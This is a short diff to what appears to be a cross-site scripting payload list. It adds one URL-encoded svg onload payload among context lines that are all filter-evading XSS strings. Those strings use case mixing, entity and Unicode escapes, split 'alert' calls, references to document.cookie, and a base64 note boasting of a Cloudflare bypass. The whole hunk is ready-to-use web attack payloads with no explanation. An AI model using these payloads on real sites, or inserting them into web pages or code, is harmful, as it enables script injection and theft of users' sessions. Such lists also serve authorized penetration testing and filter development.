@@ -23,6 +23,7 @@ a onclick="alert(1)">XSS</a>
 <svg/onload=window["al"+"ert"]1337>
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <svg onload=alert&#0000000040document.cookie)>
+<svg+onload%3Dalert%26%230000000040+"1")>
 <sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
